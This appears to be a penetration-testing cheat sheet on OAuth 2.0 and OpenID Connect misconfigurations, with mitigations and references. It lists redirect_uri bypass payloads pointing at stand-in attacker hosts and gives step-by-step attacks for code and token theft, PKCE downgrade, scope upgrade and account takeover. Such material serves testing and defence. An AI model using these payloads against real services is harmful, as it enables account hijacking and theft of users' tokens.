# OAuth 2.0 / OpenID Connect Misconfiguration

> OAuth 2.0 abuse usually exploits gaps between trust assumptions of authorization servers, clients, and resource servers.

## Summary

- [Flows in Scope](#flows-in-scope)
- [`redirect_uri` Validation Flaws](#redirect_uri-validation-flaws)
- [`state` / CSRF](#state--csrf)
- [PKCE Downgrade](#pkce-downgrade)
- [Implicit Flow Token Leak](#implicit-flow-token-leak)
- [Authorization Code Reuse](#authorization-code-reuse)
- [Scope Upgrade](#scope-upgrade)
- [Client Secret Disclosure](#client-secret-disclosure)
- [Account Takeover via OAuth](#account-takeover-via-oauth)
- [OIDC-Specific](#oidc-specific)
- [Mitigation](#mitigation)
- [References](#references)

## Flows in Scope

| Flow | Use case |
|------|----------|
| Authorization Code (+ PKCE) | Server-side and public clients (recommended) |
| Implicit (`response_type=token`) | Legacy SPA — deprecated |
| Client Credentials | M2M |
| Device Code | Smart TVs, CLIs |
| Hybrid (`response_type=code id_token`) | Some OIDC integrations |

## `redirect_uri` Validation Flaws

The most common vulnerability class. Try each variation against the registered `redirect_uri`:

```
https://attacker.tld/cb
https://target.tld.attacker.tld/cb
https://attacker.tld/cb?target.tld
https://target.tld@attacker.tld/cb
https://target.tld/cb/../../attacker
https://target.tld/cb#@attacker.tld
https://target.tld/cb?next=https://attacker.tld
https://target.tld:80@attacker.tld/cb
https://target.tld/cb//attacker.tld
https://attacker.tld/.target.tld
https://target.tld.evil.tld/cb
https://target.tld/cb%2F.attacker.tld
```

Variant — `redirect_uri` not validated at all → use any URL.
Variant — open redirect on `target.tld` chains into OAuth: `redirect_uri=https://target.tld/redirect?next=https://attacker.tld`.

### Path manipulation

```
https://target.tld/cb/../search?q=
https://target.tld/cb;evil=attacker.tld
```

If extra path is permitted, you can deliver the `code` to an arbitrary endpoint that leaks it (e.g. an open redirect).

## `state` / CSRF

If the client does **not** validate `state`, an attacker can:

1. Start their own auth flow → get `code` for **attacker** account.
2. Trick victim into visiting `target.tld/oauth/callback?code=ATTACKER_CODE&state=…`.
3. Victim's browser exchanges the code → victim is now logged into the **attacker's** account.

Now any data the victim uploads (cards, files, search history) lives in attacker's account.

## PKCE Downgrade

If the AS supports both PKCE and non-PKCE flows for the same client:

1. Attacker starts a flow without `code_challenge`.
2. Steals the `code`.
3. Redeems it without `code_verifier`.

If only PKCE is enforced for public clients, also test confidential clients without `client_secret` in case the AS doesn't check.

## Implicit Flow Token Leak

In implicit flow, the `access_token` lands in the URL fragment. If the callback page redirects to attacker-controlled URL while preserving the fragment, the token leaks.

```
https://target.tld/cb#access_token=...&token_type=bearer&expires_in=3600
```

Browsers preserve fragments across redirects → an open redirect after the callback steals the token.

## Authorization Code Reuse

`code` is supposed to be single-use. Try redeeming twice:

- Some implementations don't invalidate.
- Some return different tokens on each redeem (replay attack).
- A revoked but reusable code can let an attacker re-establish access after the legitimate user logs out.

## Scope Upgrade

Modify scope in the consent step or in the token exchange:

```
GET /authorize?...&scope=openid+profile+email          (asked for)
POST /token   ...&scope=openid+profile+email+admin     (upgraded)
```

Some AS issue tokens with the requested scope at the token endpoint without re-checking consent.

## Client Secret Disclosure

Look for client secrets in:

- Public mobile app binaries (decompile APK / IPA)
- SPA JS bundles
- GitHub leaks
- `.well-known/openid-configuration` cache

A leaked confidential-client secret allows attacker to impersonate the client.

## Account Takeover via OAuth

### Email-based linking

If `target.tld` links accounts by email and the IdP doesn't verify email:

1. Sign up to IdP with `victim@target.tld` (no verification).
2. Use OAuth Sign-In with that IdP → `target.tld` matches existing account by email → ATO.

### Pre-account hijacking

1. Attacker registers `victim@victim.tld` on `target.tld` (classic password-based).
2. Victim later signs up via OAuth — `target.tld` "merges" with existing account.
3. Attacker retains access via the password they set first.

## OIDC-Specific

- `nonce` not validated → replay of ID tokens.
- `alg=none` in ID token (same as JWT issue).
- ID token's `aud` not matching the client.
- `iss` mismatch — accept token from any IdP.
- `id_token_hint` reflected without verification.

## Mitigation

- **Exact-match** `redirect_uri`; no wildcards, no path-suffix flexibility.
- Always require and validate **state** and (for OIDC) **nonce**.
- Mandate **PKCE** for all clients (public AND confidential).
- Discontinue **implicit flow**.
- Validate `iss`, `aud`, `exp`, signature on every token.
- Email-link only after verification at both ends.
- Rotate refresh tokens with detection of reuse.

## References

- [OAuth 2.0 Threat Model — RFC 6819](https://tools.ietf.org/html/rfc6819)
- [OAuth 2.0 Security Best Current Practice](https://datatracker.ietf.org/doc/html/draft-ietf-oauth-security-topics)
- [PortSwigger — OAuth](https://portswigger.net/web-security/oauth)
- [HackTricks — OAuth](https://book.hacktricks.xyz/pentesting-web/oauth-to-account-takeover)
